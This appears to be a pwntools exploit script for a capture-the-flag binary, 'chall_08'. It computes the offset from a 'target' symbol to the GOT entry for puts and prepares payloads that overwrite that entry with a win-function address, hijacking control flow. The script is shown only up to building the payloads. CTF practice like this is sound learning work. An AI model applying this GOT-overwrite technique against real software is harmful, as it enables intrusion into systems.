from pwn import *

# RELRO (LIBC), CANARY (BOF), PIE (BOF + GOT OVERWRITE)

binary = context.binary = ELF('./chall_08')

p = process('./chall_08')

win_func = 0x00400567

puts_addr = binary.got['puts']
target = binary.sym['target']

diff = (puts_addr - target) // 8
# send the diff of puts and target, override with win func

first_payload = f'{diff}' # location of got puts relative to target
second_payload = f'{int(win_func)}' # the function we actually want to call when we call puts (goes directly to win func instead of puts function)